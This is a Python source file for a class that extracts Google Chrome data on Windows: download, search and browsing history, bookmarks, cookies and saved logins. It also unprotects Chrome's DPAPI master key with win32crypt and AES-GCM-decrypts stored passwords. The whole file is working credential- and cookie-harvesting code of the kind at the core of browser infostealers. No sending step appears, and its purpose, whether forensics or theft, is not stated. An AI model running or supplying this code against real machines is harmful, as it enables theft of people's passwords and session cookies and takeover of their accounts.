import win32crypt
import sqlite3
import base64
import json
import os

from datetime                           import datetime, timedelta
from Crypto.Cipher                      import AES
from controller.FileSystemController    import FileSystemController
from controller.SQLiteController        import SQLiteController
from controller.LogController           import LogController

# \AppData\Local\Google\Chrome\User Data\Default\Cache
class GoogleChromeController:
    
    def __init__(self):
        self.log               = LogController()
        self.fs_controller     = FileSystemController()
        self.sqlite_controller = SQLiteController()
        self.db_directory      = self.fs_controller.get_home_directory() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
        self.config_directory  = self.fs_controller.get_home_directory() + '\\AppData\\Local\\Google\\Chrome\\User Data\\'

    def get_download_history(self):
        db_file = self.db_directory + 'History'
        sql = 'SELECT * FROM downloads'
        return self.sqlite_controller.executeQuery(sql, db_file)

    def get_search_history(self):
        db_file = self.db_directory + 'History'
        sql = 'SELECT * FROM keyword_search_terms LEFT JOIN urls ON urls.id = keyword_search_terms.url_id'
        return self.sqlite_controller.executeQuery(sql, db_file)

    def get_visited_websites_history(self):
        db_file = self.db_directory + 'History'
        sql = 'SELECT * FROM visits LEFT JOIN urls ON urls.id = visits.url'
        return self.sqlite_controller.executeQuery(sql, db_file)

    def get_bookmarks(self):
        bookmarks_file = self.db_directory + 'Bookmarks'
        try:
            with open(bookmarks_file, 'r', encoding='utf-8') as file:
                json_document = json.load(file)
            return json_document
        except Exception as excepcion:
            self.log.error(excepcion)
            return None
    
    def get_cookies(self):
        cookies_db = self.db_directory + 'Network\\Cookies'
        sql = 'SELECT * FROM cookies'
        return self.sqlite_controller.executeQuery(sql, cookies_db)
    
    def get_passwords(self):
        db_file = self.db_directory + 'Login Data'
        sql = 'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created'
        return self.sqlite_controller.executeQuery(sql, db_file)

    def get_encryption_key(self):
        local_state_path = self.config_directory + 'Local State'

        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])    # decode the encryption key from Base64
            key = key[5:]                                                       # remove 'DPAPI' str

            # return decrypted key that was originally encrypted
            # using a session key derived from current user's logon credentials
            # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
        except Exception as excepcion:
            self.log.error(excepcion)
            return None
    
    def decrypt(self, valor_encriptado, clave_de_encriptacion):
        try:
            # get the initialization vector
            iv = valor_encriptado[3:15]
            valor_encriptado = valor_encriptado[15:]
            
            # generate cipher
            cipher = AES.new(clave_de_encriptacion, AES.MODE_GCM, iv)

            # decrypt password
            return cipher.decrypt(valor_encriptado)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(valor_encriptado, None, None, None, 0)[1])
            except Exception as excepcion:
                self.log.error(excepcion)
                return None

    def get_date(self, fecha_en_milisegundos):
        if fecha_en_milisegundos != 86400000000 and fecha_en_milisegundos:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=fecha_en_milisegundos)
            except Exception as excepcion:
                self.log.error(excepcion)
                return None
        else:
            return None
